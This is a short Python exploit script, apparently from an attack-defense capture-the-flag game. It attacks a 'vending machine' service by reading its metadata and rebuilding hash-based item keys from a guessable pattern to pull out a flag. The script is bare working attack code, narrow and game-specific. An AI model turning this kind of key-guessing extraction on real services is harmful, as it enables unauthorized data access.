from client import VendingClient
from hashlib import sha256
import sys

# easy and silent vuln

host = sys.argv[1]
vm_id = sys.argv[2]

client = VendingClient(host + ":11883")

meta = client.get_machine_meta(vm_id, 16, 127).strip("\x00")

flag_keys = [sha256(("{}None{}".format(x, meta)).encode()).hexdigest() for x in range(4)]
flag_parts = [client.get_vending_item(meta, k) for k in flag_keys]
print("".join(flag_parts))